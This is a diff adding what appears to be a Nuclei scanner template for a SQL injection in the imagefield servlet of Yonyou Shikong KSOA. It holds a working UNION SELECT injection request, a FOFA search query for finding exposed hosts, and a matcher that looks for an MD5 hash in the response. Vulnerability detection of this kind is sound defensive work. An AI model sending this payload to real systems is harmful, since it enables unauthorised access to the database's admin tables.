@@ -1,0 +1,30 @@
+id: yonyou-ksoa-imagefield-sqli
+
+info:
+  name: 用友时空-KSOA-imagefield-sql注入
+  author: Abbbbb
+  severity: high
+  metadata:
+    fofa-query: app="用友-时空KSOA"
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+http:
+  - raw:
+      - |
+        GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','123456'))--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+        Accept-Encoding: gzip
+        
+        
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'e10adc3949ba59abbe56e057f20f883e')"
